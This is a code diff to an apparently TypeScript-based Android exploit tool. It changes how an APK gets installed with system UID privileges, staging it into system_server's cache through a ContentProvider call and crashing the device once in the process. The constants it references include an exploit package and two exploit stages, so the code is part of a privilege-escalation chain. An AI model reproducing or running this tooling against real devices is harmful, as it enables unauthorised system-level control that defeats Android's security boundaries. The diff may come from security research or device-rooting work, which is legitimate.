@@ -4,12 +4,11 @@ import * as adb from "./adb.js";
 import {
   INSTALLER_PACKAGE,
   EXPLOIT_PACKAGE,
-  INSTALLER_ACTION,
   EXPLOIT_STAGE1_ACTION,
   EXPLOIT_STAGE2_ACTION,
   EXPLOIT_RECEIVER,
-  INSTALLER_RECEIVER,
   DEVICE_TMP_DIR,
+  STAGING_URI,
   POLL_INTERVAL_MS,
   POLL_TIMEOUT_MS,
   SYSTEM_READY_TIMEOUT_MS,
@@ -102,7 +101,8 @@ export async function bootstrap(
  * Install an APK as a system UID app.
  *
  * Requires the installer to be bootstrapped first (via `bootstrap`).
- * Pushes the target APK and sends a broadcast to the installer.
+ * Stages the APK into system_server's cache via a ContentProvider
+ * and triggers the install.
  */
 export async function installApk(apkPath: string): Promise<void> {
   const resolvedApk = path.resolve(apkPath);
@@ -122,14 +122,14 @@ export async function installApk(apkPath: string): Promise<void> {
     );
   }
 
-  const deviceApkPath = `${DEVICE_TMP_DIR}/${apkName}`;
+  const stagingFileUri = `${STAGING_URI}/${apkName}`;
 
-  console.log(`[1/3] Pushing ${apkName} to device...`);
-  await adb.push(resolvedApk, deviceApkPath);
+  console.log(`[1/3] Staging ${apkName} into system_server cache...`);
+  await adb.contentWrite(resolvedApk, stagingFileUri);
 
   console.log("[2/3] Triggering system install...");
   console.log("       (device will crash once — this is expected)");
-  await adb.broadcast(INSTALLER_ACTION, { apk_path: deviceApkPath }, INSTALLER_RECEIVER);
+  await adb.contentCall(STAGING_URI, "install", apkName);
 
   console.log("[3/3] Waiting for system to come back...");
   await adb.waitForSystemReady(SYSTEM_READY_TIMEOUT_MS, SYSTEM_READY_POLL_MS, SYSTEM_READY_SETTLE_MS);
